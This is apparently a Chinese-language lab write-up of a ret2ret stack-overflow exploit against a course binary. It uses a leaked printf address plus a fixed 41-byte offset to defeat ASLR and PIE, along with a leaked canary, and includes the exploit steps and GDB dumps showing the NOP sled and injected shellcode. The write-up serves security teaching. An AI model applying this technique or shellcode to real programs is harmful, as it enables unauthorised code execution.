## Main Idea

此处开启了stack canary、ASLR，提示我们使用 ret2ret 以绕过 ASLR。

## Magic Numbers

ret2ret 的关键在于找到一个可以利用的`ret`指令。在前两年的实验中，并没有开启 PIE ，所以可以直接通过`disas`命令来找到`ret`的地址。

而今年的实验为了加大难度开启了 PIE ，我们没办法直接找到可用的`ret`指令。然而，在函数`check_aslr`中有这么一行代码：

```cpp
printf("ASLR passed  : printf located at 0x%08x\n", (uintptr_t) printf);
```

它把`printf`函数的起始地址输出了出来，换句话说，我们利用已有的 API 可以很方便的获取`printf`的起始地址，这有什么用呢？我们对`printf`进行反汇编，有：

```
(gdb) disas printf
Dump of assembler code for function printf:
   0xf7ec70ea <+0>:     push   %ebx
   0xf7ec70eb <+1>:     call   0xf7e8f774
   0xf7ec70f0 <+6>:     add    $0x4ae98,%ebx
   0xf7ec70f6 <+12>:    sub    $0x8,%esp
   0xf7ec70f9 <+15>:    lea    0x14(%esp),%eax
   0xf7ec70fd <+19>:    push   %edx
   0xf7ec70fe <+20>:    push   %eax
   0xf7ec70ff <+21>:    push   0x18(%esp)
   0xf7ec7103 <+25>:    lea    0x238(%ebx),%eax
   0xf7ec7109 <+31>:    push   %eax
   0xf7ec710a <+32>:    call   0xf7ec936a <vfprintf>
   0xf7ec710f <+37>:    add    $0x18,%esp
   0xf7ec7112 <+40>:    pop    %ebx
   0xf7ec7113 <+41>:    ret    
End of assembler dump.
```

我们发现，`ret`指令永远在基地址偏移41个字节的地方。换句话说，`printf`中的`ret`地址的绝对位置是改变的，但是相对位置是不变的。这样，我们就有可用的`ret`指令了。

## Exploit Structure

1. 首先，将缓冲区用`nop`和SHELLCODE填充。
2. 然后，从程序返回的信息中获取`printf`的初始地址，记为`&printf`；不要忘记获取canary的值。
3. 计算得到`ret`指令的地址，即`&ret = &printf + 41`。
4. 将canary和`&ret`再次发送，完成注入。

## Exploit GDB Output

进行爆破前：
```
(gdb) x/80x &buf
0xff939f1c:     0xf7e69000      0x8683fbf8      0xf7ec1706      0x00000000
0xff939f2c:     0x00000000      0x00000000      0x00000000      0x00000000
0xff939f3c:     0x00000000      0x00000000      0x00000000      0x00000000
0xff939f4c:     0x00000000      0x00000000      0x00000000      0x00000000
0xff939f5c:     0x00000000      0x00000000      0x00000000      0x00000000
0xff939f6c:     0x00000000      0x00000000      0x00000000      0x00000000
0xff939f7c:     0x00000000      0x00000000      0x00000000      0x00000000
0xff939f8c:     0x00000000      0x00000000      0x00000000      0x00000000
0xff939f9c:     0x00000000      0x00000000      0x00000000      0x10000000
0xff939fac:     0x00000000      0xf7f030ac      0xf7f02c84      0xf7ec1797
0xff939fbc:     0x56653fa4      0xff93a0f4      0x00000001      0x56653fa4
0xff939fcc:     0xf7ec5c96      0x00000000      0xff939fec      0x00003fa4
0xff939fdc:     0x00000000      0x00000358      0x00000218      0x00000000
0xff939fec:     0x000003ef      0xffffffff      0x00000000      0x000000cc
0xff939ffc:     0x00000000      0x00001711      0x00000000      0xf7ec5c4b
0xff93a00c:     0xf7ec5b59      0x000000cc      0x000003ef      0xffffffff
0xff93a01c:     0x00000000      0xf7f030e4      0x56653fa4      0xff93a068
0xff93a02c:     0x56651689      0xff93a054
```

进行爆破后：
```
(gdb) x/80x &buf
0xff939f1c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939f2c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939f3c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939f4c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939f5c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939f6c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939f7c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939f8c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939f9c:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939fac:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939fbc:     0x90909090      0x90909090      0x90909090      0x90909090
0xff939fcc:     0x90909090      0x90909090      0xdb31c031      0xd231c931
0xff939fdc:     0xb05b32eb      0xcdc93105      0xebc68980      0x3101b006
0xff939fec:     0x8980cddb      0x8303b0f3      0x0c8d01ec      0xcd01b224
0xff939ffc:     0x39db3180      0xb0e674c3      0xb202b304      0x8380cd01
0xff93a00c:     0xdfeb01c4      0xffffc9e8      0x414552ff      0x00454d44
0xff93a01c:     0xe8bea1db      0xe8bea1db      0xe8bea1db      0xe8bea1db
0xff93a02c:     0xf7eb6113      0xff93a000
```

`printf`反汇编：
```
(gdb) disas printf
Dump of assembler code for function printf:
   0xf7eb60ea <+0>:     push   %ebx
   0xf7eb60eb <+1>:     call   0xf7e7e774
   0xf7eb60f0 <+6>:     add    $0x4ae98,%ebx
   0xf7eb60f6 <+12>:    sub    $0x8,%esp
   0xf7eb60f9 <+15>:    lea    0x14(%esp),%eax
   0xf7eb60fd <+19>:    push   %edx
   0xf7eb60fe <+20>:    push   %eax
   0xf7eb60ff <+21>:    push   0x18(%esp)
   0xf7eb6103 <+25>:    lea    0x238(%ebx),%eax
   0xf7eb6109 <+31>:    push   %eax
   0xf7eb610a <+32>:    call   0xf7eb836a <vfprintf>
   0xf7eb610f <+37>:    add    $0x18,%esp
   0xf7eb6112 <+40>:    pop    %ebx
   0xf7eb6113 <+41>:    ret    
End of assembler dump.
```

因为开启了 ASLR 和 PIE，所以会出现几次 Segmentation Fault，这是正常现象。比如我这截取到的爆破后的GDB输出，是没有办法正常执行SHELLCODE的。